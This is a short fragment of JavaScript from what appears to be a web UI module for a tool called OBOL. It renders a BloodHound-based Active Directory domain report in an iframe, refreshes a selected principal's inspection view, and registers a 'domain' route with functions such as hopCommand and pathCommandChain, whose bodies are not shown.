      if (slot) slot.innerHTML = '<h2 class="coach-sec-h">Domain report</h2><iframe class="bh-report-frame" id="bh-frame"></iframe>';
      var frame = document.getElementById('bh-frame');
      if (frame) frame.srcdoc = htmlDoc;
    });

    if (_inspecting && document.getElementById('bh-inspect-slot')) {
      var still = OBOL.bloodhound.principalList((OBOL.store.active() || {}).bloodhound || {}, {})
        .some(function (p) { return shortName(p.name).toUpperCase() === shortName(_inspecting).toUpperCase(); });
      if (still) doInspect(_inspecting); else _inspecting = null;
    }
  }

  OBOL.routes = OBOL.routes || {};
  OBOL.routes.domain = { render: render, mounted: mounted, hopCommand: hopCommand, pathCommandChain: pathCommandChain, getSamplePreset: getSamplePreset };
})(typeof globalThis !== 'undefined' ? globalThis : this);
